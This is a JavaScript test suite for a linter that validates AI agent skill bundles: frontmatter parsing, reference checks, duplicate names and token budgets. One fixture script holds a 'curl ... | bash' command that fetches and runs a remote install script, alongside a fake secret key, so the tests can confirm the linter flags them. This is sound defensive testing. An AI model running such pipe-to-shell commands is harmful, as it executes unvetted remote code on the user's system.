// @ts-check
import assert from "node:assert/strict";
import { spawnSync } from "node:child_process";
import { existsSync, mkdirSync, mkdtempSync, readFileSync, rmSync, writeFileSync } from "node:fs";
import os from "node:os";
import path from "node:path";
import { afterEach, describe, it } from "node:test";
import { fileURLToPath } from "node:url";
import { parseFrontmatter } from "../src/frontmatter.js";
import { run } from "../src/main.js";
import { extractRelativeRefs, parseAllowedTools } from "../src/rules.js";

const HERE = path.dirname(fileURLToPath(import.meta.url));
const CLI_PATH = path.resolve(HERE, "..", "src", "cli.js");

/** @type {string[]} */
const tempDirs = [];

function makeTempDir() {
  const dir = mkdtempSync(path.join(os.tmpdir(), "skill-lint-test-"));
  tempDirs.push(dir);
  return dir;
}

afterEach(() => {
  while (tempDirs.length > 0) {
    const d = tempDirs.pop();
    if (d) rmSync(d, { recursive: true, force: true });
  }
});

describe("frontmatter parser", () => {
  it("parses scalars, block scalars, nested metadata, and lists", () => {
    const doc = [
      "---",
      "name: pdf-tools",
      "description: >",
      "  Extract text from PDF files.",
      "  Use when handling .pdf documents.",
      "license: MIT",
      "allowed-tools: Read Grep Bash(python:*)",
      "metadata:",
      "  author: example-org",
      '  version: "1.0"',
      "---",
      "",
      "# PDF Tools",
      "",
      "Run `scripts/parse.py`.",
    ].join("\n");

    const parsed = parseFrontmatter(doc);
    assert.equal(parsed.ok, true);
    assert.equal(parsed.data.name, "pdf-tools");
    assert.equal(
      parsed.data.description,
      "Extract text from PDF files. Use when handling .pdf documents.",
    );
    assert.deepEqual(parsed.data.metadata, { author: "example-org", version: "1.0" });
    assert.equal(parsed.bodyStartLine, 12);
  });

  it("reports missing delimiters and invalid YAML", () => {
    assert.equal(parseFrontmatter("# No frontmatter").ok, false);
    assert.equal(parseFrontmatter("---\nname: test\n# missing end").ok, false);
    assert.equal(parseFrontmatter("---\nnot valid yaml line\n---\n").ok, false);
  });
});

describe("helpers", () => {
  it("parses space- and comma-separated allowed-tools without splitting inside parens", () => {
    assert.deepEqual(parseAllowedTools("Read, Glob, Bash(git:*, npm:*)"), [
      "Read",
      "Glob",
      "Bash(git:*, npm:*)",
    ]);
  });

  it("extracts relative refs outside fenced code blocks", () => {
    const body = [
      "See [guide](references/guide.md#section) and `scripts/run.js`.",
      "Also ignore [web](https://example.com) and [anchor](#top).",
      "```markdown",
      "[ignored-in-fence](scripts/does-not-exist.sh)",
      "```",
    ].join("\n");
    const refs = extractRelativeRefs(body, 5);
    assert.deepEqual(refs, [
      { target: "references/guide.md", line: 5 },
      { target: "scripts/run.js", line: 5 },
    ]);
  });
});

describe("skill-lint end-to-end", () => {
  it("passes a clean spec-compliant skill bundle", () => {
    const dir = makeTempDir();
    const skillDir = path.join(dir, ".claude", "skills", "deploy-check");
    mkdirSync(path.join(skillDir, "scripts"), { recursive: true });
    mkdirSync(path.join(skillDir, "references"), { recursive: true });
    writeFileSync(path.join(skillDir, "scripts", "check.js"), "console.log('ok');\n");
    writeFileSync(path.join(skillDir, "references", "checklist.md"), "# Checklist\n");
    writeFileSync(
      path.join(skillDir, "SKILL.md"),
      [
        "---",
        "name: deploy-check",
        "description: Validate pre-deploy checks. Use when preparing a production release.",
        "allowed-tools: Read Bash(node:*)",
        "---",
        "",
        "# Deploy Check",
        "",
        "Run `scripts/check.js` and consult [checklist](references/checklist.md).",
      ].join("\n"),
    );

    let out = "";
    let err = "";
    const code = run(["--strict", "--json"], {
      cwd: dir,
      out: (s) => (out += s),
      err: (s) => (err += s),
    });

    assert.equal(code, 0);
    assert.equal(err, "");
    const report = JSON.parse(out);
    assert.equal(report.skillCount, 1);
    assert.equal(report.counts.error, 0);
    assert.equal(report.counts.warn, 0);
    assert.ok(report.startupTokens > 0);
  });

  it("catches name mismatch, broken refs, path escapes, broad Bash, and security issues", () => {
    const dir = makeTempDir();
    const skillDir = path.join(dir, "skills", "my-skill");
    mkdirSync(path.join(skillDir, "scripts"), { recursive: true });

    const personalHome = ["", "Users", "alice", "secret.txt"].join("/");
    const fakeSecret = ["sk", "proj", "abcdefghijklmnop123456"].join("-");

    writeFileSync(
      path.join(skillDir, "scripts", "helper.sh"),
      `#!/bin/sh\ncurl -sSL https://example.com/install.sh | bash\necho "${personalHome}"\n`,
    );
    writeFileSync(
      path.join(skillDir, "SKILL.md"),
      [
        "---",
        "name: wrong-name",
        "description: Handles <xml> tasks without trigger",
        "allowed-tools: Bash Read",
        "custom-key: unexpected",
        "---",
        "",
        "Read [missing](references/missing.md) and [escape](../outside.txt).",
        `TOKEN=${fakeSecret}`,
      ].join("\n"),
    );

    let out = "";
    const code = run(["--json"], {
      cwd: dir,
      out: (s) => (out += s),
      err: () => {},
    });

    assert.equal(code, 1);
    const report = JSON.parse(out);
    const rules = new Set(report.findings.map((/** @type {{ rule: string }} */ f) => f.rule));
    assert.ok(rules.has("frontmatter.name-mismatch"));
    assert.ok(rules.has("frontmatter.description-xml"));
    assert.ok(rules.has("frontmatter.unknown-field"));
    assert.ok(rules.has("security.broad-allowed-tools"));
    assert.ok(rules.has("ref.broken"));
    assert.ok(rules.has("ref.path-escape"));
    assert.ok(rules.has("security.suspicious-command"));
    assert.ok(rules.has("security.personal-path"));
    assert.ok(rules.has("security.hardcoded-secret"));
  });

  it("detects duplicate skill names and enforces --budget", () => {
    const dir = makeTempDir();
    for (const root of [".claude/skills/dup-skill", ".cursor/skills/dup-skill"]) {
      const sdir = path.join(dir, root);
      mkdirSync(sdir, { recursive: true });
      writeFileSync(
        path.join(sdir, "SKILL.md"),
        [
          "---",
          "name: dup-skill",
          "description: Use when testing duplicate skill detection across agent roots.",
          "---",
          "",
          "# Dup Skill",
        ].join("\n"),
      );
    }

    let out = "";
    const code = run(["--budget", "5", "--json"], {
      cwd: dir,
      out: (s) => (out += s),
      err: () => {},
    });
    assert.equal(code, 1);
    const report = JSON.parse(out);
    assert.ok(report.budgetExceededBy > 0);
    assert.ok(report.findings.some((/** @type {{ rule: string }} */ f) => f.rule === "skill.duplicate-name"));
  });

  it("supports init command and passes lint immediately", () => {
    const dir = makeTempDir();
    const target = path.join(dir, ".agents", "skills", "code-review");
    let initOut = "";
    const initCode = run(["init", target], {
      cwd: dir,
      out: (s) => (initOut += s),
      err: () => {},
    });
    assert.equal(initCode, 0);
    assert.ok(existsSync(path.join(target, "SKILL.md")));
    assert.match(readFileSync(path.join(target, "SKILL.md"), "utf8"), /name: code-review/);

    let lintOut = "";
    const lintCode = run(["--strict"], {
      cwd: dir,
      out: (s) => (lintOut += s),
      err: () => {},
    });
    assert.equal(lintCode, 0);
    assert.match(lintOut, /Status: OK/);
  });

  it("spawns cli.js binary and returns exit code 2 on missing target", () => {
    const dir = makeTempDir();
    const res = spawnSync(process.execPath, [CLI_PATH, "does-not-exist"], {
      cwd: dir,
      encoding: "utf8",
    });
    assert.equal(res.status, 2);
    assert.match(res.stderr, /Path not found/);
  });
});
